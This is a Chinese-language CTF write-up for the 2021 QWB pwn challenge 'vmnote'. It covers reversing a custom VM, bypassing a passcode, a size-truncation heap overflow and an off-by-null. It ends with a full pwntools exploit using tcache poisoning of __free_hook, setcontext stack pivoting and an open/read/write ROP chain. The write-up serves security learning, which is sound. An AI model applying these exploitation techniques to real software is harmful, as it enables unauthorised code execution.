---
date: 2024-8-22 10:22:03
layout: post
title: 2021 qwb vmnote writeup
subtitle: 
description: >-
    咋会有虚拟机套壳菜单堆这种阴间玩意，，下次看它还能套啥
image: >-
  /assets/img/uploads/vmnote.jpg
optimized_image: >-
  /assets/img/uploads/vmnote.jpg
category: ctf
tags:
  - ctf
  - pwn
  - 虚拟机题
  - vmnote
author: rosayxy
paginate: true
---

# 2021 qwb vmnote writeup
这道题刷新了 rosayxy 的单题用时最长记录，从编译器比赛前打到比赛后，估计用时 40h，打下来收获巨大，同时感谢 k4ra5u 同学的鼓励和帮助 ~
## 表述
本文中将以“内层”表示 IDA 里面的那个虚拟机，将以“外层”表述我们 dump 出来的菜单堆题的那一层 ~     
此外，对应内层里 0x70e0 的地方我们称为栈，虽然它可以按下标访问，和正常的函数栈有区别但是就这样称呼叭（孩子逆都逆完了.jpg）   
## 逆向
题目实现了一个虚拟机，但是和正常虚拟机不同的是，它是从 **note.bin** 里面读入 opcodes 并且进行解析成具体指令     
题目逆向本身不难，就像正常的虚拟机逆向一样，但是注意到有 opcode 对应如下的链表操作，就有点像菜单题   
![alt_text](/assets/img//uploads/image.png)

我们把所有 opcode dump 出来，得到如下格式的将近500行 x86 汇编
![alt_text](/assets/img/uploads/vmnote_codes.png)
然后就是手看汇编的过程啦，逆出来发现是一些对外层栈的加密操作和一个菜单题        

### 外层栈加密
栈上内容加密是在外层汇编的 0x4ab 的位置，思路是对0x1000到0x118d 的栈内容进行加密，加密函数为 0x5ba 处，算法为
```
while(true){
    stack[%0]=((stack[%0]-%5)&0xff)^%1;
    if stack[%0]==0{
        break;
    }
    cnt++;%5++;
}
```
如果不是很想逆向，可以像笔者一样，**挂个gdb上去在它加密完的地方提取这些内容**就行了

## passcode bypass
唉，纯逆向活，手逆外层汇编，逆出来加密逻辑长下面这样
```py
def passcode_encode(passcode,reg1):
    qword1=passcode[17:25]
    qword1=u64(qword1)
    qword1-=0x12345678
    assert(qword1==reg1)
    # 0x739 调用的时候 %0 是 buffer_offset %1 是0x101f %2 是 0x11
    for i in range(0x11):
        passcode[i]=stack1[passcode[i]]
    for i in range(0x11):
        assert(passcode[i]==stack[0x1120+i])
```
我们采用下面的方法求出 passcode:
```py
s=b""
for i in range(17):
    c=stack2[i]
    for j in range(256):
        if stack1[j]==c:
            s+=p8(j)
            break
l=p.recvline()
rand_num=int(l.split()[-1])
print(rand_num)
num2=rand_num+0x12345678
print(hex(num2))
s+=str(num2).encode("latin-1") # 这里不能发 p64 啊啊啊 因为代码里面调用的是 atoi 函数
```
需要注意的是，不能按照惯性认为后一段 passcode 是用 p64 发的，从代码中可以看到它是调用了 atol 函数 把 passcode-0x12345678 存在栈上再做的比较

## 漏洞
### 内层漏洞
那个关于菜单的 opcode (序号 0x19) 的 case6 存在如下问题：
```c
buf = (char *)regs_1;
      nbytes = regs_2[0];                       // 漏洞：这里 is_find_cond 传参的时候，传的 regs_2[0] 是32位，而实际 nbytes 是64位
      if ( regs_2[0] > 0 && is_find_cond((__int64)regs_1, regs_2[0]) )
      {
        v0 = read(0, buf, nbytes);
        if ( v0 > 0 && buf[v0 - 1] == 10 )
          buf[v0 - 1] = 0;
      }
      break;
```
nbytes 是8字节，但是传入 is_find_cond 的时候，第二个参数是int类型，调用 read 的时候读入的大小和 nbytes 相同，可知如果 nbytes 大于 0x100000000 且满足 int(nbytes)==一个正常的 siz 的话，会**出现堆溢出**      
可以 mark 一下这个洞，个人感觉好隐蔽，看了好久     

### 外层漏洞
然而我们逆向外层发现 create 对 size 在 0~0x60 有非常严格的检查，无法触发该内层漏洞   
这时候，队友给出了外层还有漏洞的提示，可以看到 read_in (0x5ef处) 有一个 off-by-null

## 利用思路
外层漏洞可以把 delete 和 show 函数中的 saved rbp 的末字节覆盖为 0x00，且返回时都用了 "leave;ret"，这是很经典的**栈迁移**的模式，这时候**如果我们可以控制栈上 0x1e00/0x1f00 处的内容，就可以对外层操作打 ROP 了**，并且可以看出，这里在外层打 ROP 和我们正常的 ROP 间没有操作上的区别     
however，我们不一定可以控制栈上 0x1e00/0x1f00 处的内容，而且两次 ROP 都需要控制这块内存，所以有以下两点注意的地方：1. 要爆破，而且两次 ROP 综合起来的爆破可能是1/32的概率（from khls: 我们需要一个品相好的 rip ） 2. 第一次 ROP 中要先调用一些 ret 来升外层的栈，否则第二次 ROP 的位置对不上     
外层触发：先正常的 create 一个正常堆块 如 0x40 之类的大小 然后传一个比如说是 0x100000040 的 nbytes，找 gadget 赋值 regs2 再调用到 0xa4 的位置去 read 造成堆溢出     
内层触发：
- 首先它 read 之后不会补0，所以正好可以直接泄露堆地址
- 然后我们利用 tcache poisoning 分配一个堆块到堆上泄露残留的 libc 地址
- 再打一次，利用 tcache poisoning 打 free_hook，接下来就全是套路了，belike: free_hook 上填 magic_gadget 然后布置堆上相应空间来调用 setcontext+61，栈迁移之后打 orw 就好啦

## 打的过程中的一些点
因为它每次分了一个 0x18 的堆块来保存链表结构，所以要注意不覆盖我们写 setcontext 的堆块（在我的 exp 中是0号堆块）    
同样也注意不要覆盖 tcache fd 指针ww 不然会报 corruption          
此外，在找外层漏洞的时候尝试手写 fuzz （尝试用了 AFL++ 但是不知道什么原因它会不能完成 first_handshake 然后直接 abort 就比较奇怪吧）（再次感谢 khls 指点ww），然后发现有异常的输出但是可能还是因为 fuzz 无效操作有点多所以看不出来洞，，但是总体而言，可能也许大概知道怎么手写 fuzz 了hhh    

## exp
```py
from signal import pause
from time import sleep
from pwn import*
from random import randint, random
p=process("./vmnote")
context(log_level="debug",arch="amd64")
libc=ELF("./libc-2.31.so")
# try solve passcode
# 先 break 到第一次 ret 的位置,此时栈上从0x1000 开始的信息在 extracted_stack 文件中
# passcode 1. 长度大于 0x11 reg1 是 given_rand
stack1=[218, 179, 148, 171, 119, 96, 184, 110, 192, 93, 154, 165, 95, 46, 76, 181, 98, 239, 185, 231, 168, 72, 195, 60, 22, 67, 31, 8, 219, 230, 217, 201, 56, 92, 2, 61, 125, 251, 3, 246, 176, 190, 134, 216, 19, 48, 89, 229, 208, 147, 145, 9, 194, 81, 4, 177, 65, 213, 113, 236, 32, 7, 250, 207, 85, 204, 146, 133, 127, 200, 49, 94, 223, 33, 163, 245, 55, 71, 186, 120, 254, 174, 62, 43, 37, 25, 151, 64, 252, 78, 132, 167, 225, 241, 140, 88, 143, 144, 161, 211, 215, 122, 45, 13, 100, 14, 53, 105, 189, 221, 224, 166, 235, 155, 234, 87, 206, 35, 30, 121, 40, 170, 75, 6, 103, 227, 18, 77, 175]
# 0x58b1230458d793d0   0x5123d0ead0d5931e 0x58 提取 stack2
stack2=[0xd0,0x93,0xd7,0x58,0x04,0x23,0xb1,0x58,0x1e,0x93,0xd5,0xd0,0xea,0xd0,0x23,0x51,0x58]
def passcode_encode(passcode,reg1):
    qword1=passcode[17:25]
    qword1=u64(qword1)
    qword1-=0x12345678
    assert(qword1==reg1)
    # 0x739 调用的时候 %0 是 buffer_offset %1 是0x101f %2 是 0x11
    for i in range(0x11):
        passcode[i]=stack1[passcode[i]]
    for i in range(0x11):
        assert(passcode[i]==stack[0x1120+i])

def create(idx,siz,content):
    p.recvuntil("choice>> ")
    p.sendline("1")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(siz))
    p.recvuntil("content: ")
    p.send(content)
def show(idx):
    p.recvuntil("choice>> ")
    p.sendline("2")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
def delete(idx):
    p.recvuntil("choice>> ")
    p.sendline("4")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
# decode passcode
s=b""
for i in range(17):
    c=stack2[i]
    for j in range(256):
        if stack1[j]==c:
            s+=p8(j)
            break
l=p.recvline()
rand_num=int(l.split()[-1])
print(rand_num)
num2=rand_num+0x12345678
print(hex(num2))
s+=str(num2).encode("latin-1") # 这里不能发 p64 啊啊啊 因为代码里面调用的是 atoi 函数
p.recvuntil("passcode: ")
p.sendline(s)
cnt=0
s=""

# 外层实现的 read_in 有一个 off-by-null 覆盖 rbp 的低字节为 0x00 从而劫持 sp 为 0x1f00 之类的数，这个 show 和 remove 里面都可用
# 打 ROP，利用 show_entry,先在 read_idx 中把 0x1f00 之类的地址赋值为我们想要跳转到的函数地址，然后去溢出覆盖 rbp 进而栈迁移
# 我们内层需要触发: 先正常的 create 一个正常堆块 如 0x40 之类的大小 然后传一个比如说是 0x100000040 的 nbytes  赋值 regs2
# libc leak: 内层需要一个申请 0x1d0 的堆块 就 pop_%1 %0 那个 gadget 再调 0x77

create(0,0x60,"A")
create(1,0x60,"B")
create(2,0x60,"C")
delete(2)
delete(0)
create(0,0x60,"d")
show(0)                # heap leak
pop_1_2_ret=0x764
ret=0x628
# 本轮 ROP: buf 利用 gadget 回 0x764 直接溢出
p.recvuntil("content: ")
heap_base=u64(p.recv(6).ljust(8,b"\x00"))-0x764
print(hex(heap_base))
# rop
#gdb.attach(p)
#pause()
create(2,0x60,"e")
delete(1)
delete(2)

p.recvuntil("choice>> ")
p.sendline("2")
p.recvuntil("idx: ")
ropchain=p64(ret)*6+p64(pop_1_2_ret)+p64(heap_base+0x690)+p64(0x100000000+0x50)+p64(0xaa)+p64(0x145) # 先简单升一下栈，方便后续打
payload=b"6hhhhhhh"+ropchain
p.send(payload)
sleep(0.4)
payload2=b"a"*0x60+p64(0)+p64(0x21)+p64(heap_base+0x690)+p64(0x20000000060)+p64(0)+p64(0x71)+p64(3)*12+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x71)+p64(heap_base+0x2f0)
p.send(payload2)
# 手动发 create(3,0x60,"g"*8)
cnt=0
p.recvuntil("choice>> ")

p.sendline("1")
recv=p.recv(timeout=0.01)
if b"choice" in recv:
    p.sendline("1")
    p.recvuntil("idx: ")
    p.sendline("3")
elif b"idx" in recv:
    p.sendline("3")

p.recvuntil("size: ")
p.sendline("96")
p.recvuntil("content: ")
p.send("g")

create(2,0x60,"g"*24)
show(2)
#  0x7fe12af73000 0x7fe12b15f5c0
p.recvuntil("content: gggggggggggggggggggggggg")
libc_leak=u64(p.recv(6).ljust(8,b"\x00"))
libc_base=libc_leak-0x1ec5c0
print(hex(libc_base))
free_hook=libc_base+libc.sym["__free_hook"]
delete(3)
create(1,0x50,"h")
create(3,0x50,"i")
delete(1)
delete(3)
p.recvuntil("choice>> ")
p.sendline("2")
p.recvuntil("idx: ")
ropchain=p64(pop_1_2_ret)+p64(heap_base+0x690)+p64(0x100000000+0x50)+p64(0xaa)+p64(0x145)
payload=b"6hhhhhhh"+p64(0)+p64(ret)*5+ropchain # 看栈够不够 发现不够，那就升吧
# set {int}$rebase(0x70b8)=0x1e30 set {int}$rebase(0x70c0)=0x1ec8
#gdb.attach(p)
#pause()
p.send(payload)
pop_rdi=0x26b72+libc_base
pop_rsi=0x27529+libc_base
pop_rdx_r12=0x11c371+libc_base
flag_addr=heap_base+0x990+0x100
pop_rax=0x4a550+libc_base
syscall=libc_base+libc.symbols["read"]+0x10
rop=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
rop+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(libc_base+libc.symbols["read"])
rop+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(libc_base+libc.symbols["write"])
#my_payload=flat({0x8:p64(heap_base+0x690),0x20:p64(libc_base+libc.symbols["setcontext"]+61),0x78:p64(heap_base+0x100),0xa0:p64(heap_base+0x100),0xa8:p64(ret),0x100:ropchain,0x300:b"flag\x00"})
payload3=b"a"*0x8+p64(heap_base+0x690)+p64(3)*2+p64(libc_base+libc.symbols["setcontext"]+61)+p64(0)*7+p64(0)+p64(0x21)+p64(heap_base+0x690)+p64(heap_base+0x990)+p64(0)+p64(0x71)+p64(3)*2+p64(heap_base+0x990)+p64(libc_base+0x581ee)+p64(0)*8+p64(0)+p64(0x21)+p64(heap_base+0x690)+p64(0x60)+p64(0)+p64(0x71)+p64(0)*12
# 这一步覆盖的时候注意维护原有链表结构和维护 free 的 tcache 的 fd 指针
payload3+=p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x61)+p64(0)*10+p64(0)+p64(0x61)+p64(free_hook)+p64(0)*9+p64(0)+p64(0x21)+p64(heap_base+0x820)+p64(0)+p64(0)+p64(0x206f1)
payload3=payload3.ljust(0x300,b"\x00")+rop
payload3=payload3.ljust(0x400,b"\x00")+b"flag\x00"
magic=libc_base+0x154930   # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
sleep(0.4)
p.send(payload3)
#create(1,0x50,"j")

p.recvuntil("choice>> ")

p.sendline("1")
recv=p.recv(timeout=0.01)
if b"choice" in recv:
    p.sendline("1")
    p.recvuntil("idx: ")
    p.sendline("1")
elif b"idx" in recv:
    p.sendline("1")

p.recvuntil("size: ")
p.sendline("80")
p.recvuntil("content: ")
p.send("g")
# gdb.attach(p)
# pause()
create(3,0x50,p64(magic)*2)

delete(0)

# delete 1 会调用 free hook 此时进行栈迁移
p.interactive()
```
原题和所有做题痕迹见  [这里](/attachments/vmnote.zip)